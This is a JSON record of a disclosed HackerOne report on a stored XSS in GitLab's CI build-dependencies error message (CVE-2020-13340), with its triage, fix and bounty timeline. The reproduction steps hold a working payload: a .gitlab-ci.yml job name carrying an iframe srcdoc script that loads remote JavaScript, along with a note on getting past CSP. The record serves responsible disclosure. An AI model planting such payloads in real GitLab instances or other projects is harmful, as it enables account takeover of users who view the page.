@@ -1,0 +1,440 @@
+{
+  "id": 950190,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTA=",
+  "url": "https://hackerone.com/reports/950190",
+  "title": "Store-XSS in error message of build-dependencies ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-03T13:15:26.987Z",
+  "submitted_at": "2020-08-03T13:15:27.182Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yvvdwf",
+    "url": "/yvvdwf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-13340"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-12-01T08:04:06.926Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-01T08:04:06.860Z",
+  "team_member_agreed_on_going_public_at": "2020-11-30T23:22:00.345Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nA stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.\n\n### Steps to reproduce\n\nThe following steps should to be reproduced in a self-managed installation of gitlab\n\n1. Create an empty project\n2. Go to \"Settings/CI/CD/Runners\" to setup a runner for this project\n3. Create new file `.gitlab-ci.yml` for this project using the following content:\n\n```yaml\ntest<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:\n  stage: build\n  script: \n    - date > index.html\n  artifacts:\n    paths: \n      - index.html\n    expire_in: 1 second\n\njob-test:\n  stage: test\n  script: echo \"hi\"\n  dependencies: [\"test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>\"]\n```\n\n4. Wait for the jobs terminated, go to the detail of `job-test`\n5. You should see an alert that contains the current url\n\n### Impact\n\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. \nFurthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.\n\n### What is the current *bug* behavior?\n\nThe `failure_message` has been considered as [safe](https://gitlab.com/gitlab-org/gitlab/-/blob/2a5ebef661656937f823736f4f84400a8979b576/app/serializers/build_details_entity.rb#L135)\n\n### What is the expected *correct* behavior?\n\nThe `failure_message` should be sanitized.\n\n### Relevant logs and/or screenshots\n\nPlease see a screenshot in attached file\n\n### Output of checks\n\n#### Results of GitLab environment info\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n```\nSystem information\nSystem:\t\tUbuntu 18.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.6p146\nGem Version:\t2.7.10\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t5.0.9\nGit Version:\t2.27.0\nSidekiq Version:5.2.9\nGo Version:\tunknown\n\nGitLab information\nVersion:\t13.2.2-ee\nRevision:\t618883a1f9d\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t11.7\nURL:\t\thttp://gl.local\nHTTP Clone URL:\thttp://gl.local/some-group/some-project.git\nSSH Clone URL:\tgit@gl.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t13.3.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nStored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. \nFurthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 934607,
+      "file_name": "Screenshot_2020-08-03_at_14.50.32.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ts6SDeb8WLD5E5t8rC6amdda?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-08-03_at_14.50.32.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-08-03_at_14.50.32.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072024Z&X-Amz-Expires=3016&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dc86831bd2a48f3a74f6a1147369b4801ae9aa9afd270062b7034d76e774d147",
+      "file_size": 962203,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 35,
+  "voters": [
+    "alpharingo",
+    "sw33tlie",
+    "n1m0",
+    "bibekshah",
+    "tess",
+    "ali",
+    "mik317",
+    "0xelkomy",
+    "aryan2808",
+    "zeroxyele",
+    "and 25 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 8835044,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @yvvdwf,\n\nThank you for submitting this report! We will investigate the issue as soon as\npossible, and should get back within a week.\n\nPlease do not submit your report or ask about its status through additional\nchannels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2020-08-03T13:19:39.585Z",
+      "updated_at": "2020-08-03T13:19:39.585Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 8841538,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi,\n\nI confirm that I can reproduce on gitlab.com. An example is available here: https://gitlab.com/yvvdwf/ci-dependencies/-/jobs/669728590\n\nTo reproduce: please find in attached file the export of an example project, then import it in gitlab.com\n\nBest regards",
+      "automated_response": false,
+      "created_at": "2020-08-04T08:13:26.737Z",
+      "updated_at": "2020-08-04T08:13:26.737Z",
+      "actor": {
+        "username": "yvvdwf",
+        "cleared": false,
+        "verified": false,
+        "url": "/yvvdwf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 935740,
+          "filename": "2020-08-04_10-01-076_root_ci-dependencies_export.tar.gz",
+          "type": "application/gzip",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SuN35ZuG9xMvJPvnwSQTb7bk?response-content-disposition=attachment%3B%20filename%3D%222020-08-04_10-01-076_root_ci-dependencies_export.tar.gz%22%3B%20filename%2A%3DUTF-8%27%272020-08-04_10-01-076_root_ci-dependencies_export.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEWFC242%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072024Z&X-Amz-Expires=3016&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQDEVwk7bxj1jglcYZLYXzEC13a%2FALjR54pLU%2FsBVt%2BZvAIgC1t081Aw5%2Bk7M7ZEU46AUFdO2DKTk5ZGnZDVBCMCHrMqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFtHwxOGkBPnYOBRcSqPBVOxjjASsIMug1nG7flVJUOFjNYk1525RkW7LpVGnfwJCFqcRkxO7pg%2F21JoyOO0HhQZDZVVeszIiThWSZDq3NvJkB3qEuSUHpgRrf%2FnadR72Y%2BgiPjZe0wY28Mwo98IaXaBR2kAWH2jC5rgUu9K2q%2FlW17IoTDHjB6%2Fs6IiiYCM%2BBcZFOw%2BWNqlFB%2BhjRw%2Bl7ZWlMkB1NM8%2F5FbP2BcpsO%2F9Si0a6DME7X%2F%2F4wHjkgfN4uBLTAXkCLgsUV%2Fd0PWvkyBSUIk1pfG7445ZT7jtmecNppsPJUT3daU4IufUbhM0Bajh0xFUbz%2F6j2R3iLuC0tjdipLvzDrwqBFdboB81c00HUWDxuMeDWXJr1OzB5SmxU3r75UoJ17ZBIPH5Jni%2Fxkm2%2F8U0yz5xmgrxAk2vuUtz9zW7pi2yRVxUv5Wb9vv8qzixUSpqolUBTHLBKjT0B7%2BH3XMdeSk7Yi8WEozyMfM6D3w9LpbvL1RjxX3HuvwFYEAbcnxKAuzPpuQOGpLqPWWdEP2QWb3%2BSf%2Fgjs797aPbdT2QubyUYuu6UawYh1RmPFTRbCJPMZa52EH6ExFXqzZNf2d6v35uXrT4ABVJaSQubDhIPFwGOW%2BXNcSuwi1YtoSepyZ01fNUCYLRnnv0Bzi4LIk%2BG0z3DuyL0V%2F3E7QeFHRgEkG84oRSWaFDeZaphiA8XqToJX%2Bugp9oBVG73IrvySXQ%2FszZJr670iLVDVA9Y2RXPhniZYGTqkRa2wGAqvq196imVU9XvuGUdntO7kcfehxUYH%2FNtGdGjR58bchUt7dwOYEjG2%2FUu4%2BFgag7VHHeHbLo46FHwAuNXBAR%2FRJklmecinxbREWqIH674S%2Bb2Bbz5iIcPIRNBm4T8wmYW5qAY6sQFc1K0fy6ipqcqMoJ9yELh17%2FzVcNxI%2FZQvaf2ePD8FIi6hcDtz%2FxKA9t0JO9BF4fjWmWRzvibzEfJHmi4fR%2BRudIzFC8%2FgV2YYkqUzH8GODOztA5ppSWNx1pqMKvJF3Kp5esr234z2Pke3gjKaQhNZhGAxhptYSvZPsk4XY1dB%2BiT%2FT3R4Gvu8TkS1V%2FJ6HsVN5mbVqJJsWVAFnWsqzCKj8NgJCCI5s8B7vTpsDlASx9A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b6aef91ecefaef7288c77d2da19e8d50258b4ce7f99be0ed08407be4a5f35ab"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 8843058,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hello,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/233473.  This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2020-08-04T10:53:35.479Z",
+      "updated_at": "2020-08-04T10:53:35.479Z",
+      "actor": {
+        "username": "hackerjuan",
+        "cleared": false,
+        "verified": false,
+        "url": "/hackerjuan",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 8843111,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-04T11:04:07.846Z",
+      "updated_at": "2020-08-04T11:04:07.846Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "yvvdwf",
+        "url": "/yvvdwf"
+      }
+    },
+    {
+      "id": 9232621,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ETA for fix:\n\nHi @yvvdwf,\n\nThe issue you reported is currently scheduled to be fixed by 2020-10-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2020-09-16T04:21:06.819Z",
+      "updated_at": "2020-09-16T04:21:06.819Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9570903,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ETA for fix:\n\nHi @yvvdwf,\n\nThe issue you reported is currently scheduled to be fixed by 2020-11-30.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2020-10-20T04:20:55.862Z",
+      "updated_at": "2020-10-20T04:20:55.862Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9706922,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-11-02T20:12:04.639Z",
+      "updated_at": "2020-11-02T20:12:04.639Z",
+      "cve_ids": [
+        "CVE-2020-13340"
+      ],
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9707204,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @yvvdwf,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.5.2 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2020-11-02T20:51:07.054Z",
+      "updated_at": "2020-11-02T20:51:07.054Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "yvvdwf",
+        "url": "/yvvdwf"
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9707207,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-11-02T20:51:46.639Z",
+      "updated_at": "2020-11-02T20:51:46.639Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "yvvdwf",
+        "url": "/yvvdwf"
+      }
+    },
+    {
+      "id": 9967861,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-11-30T23:22:00.373Z",
+      "updated_at": "2020-11-30T23:22:00.373Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9970786,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-12-01T08:04:06.887Z",
+      "updated_at": "2020-12-01T08:04:06.887Z",
+      "actor": {
+        "username": "yvvdwf",
+        "cleared": false,
+        "verified": false,
+        "url": "/yvvdwf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9970787,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-12-01T08:04:06.955Z",
+      "updated_at": "2020-12-01T08:04:06.955Z",
+      "actor": {
+        "username": "yvvdwf",
+        "cleared": false,
+        "verified": false,
+        "url": "/yvvdwf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
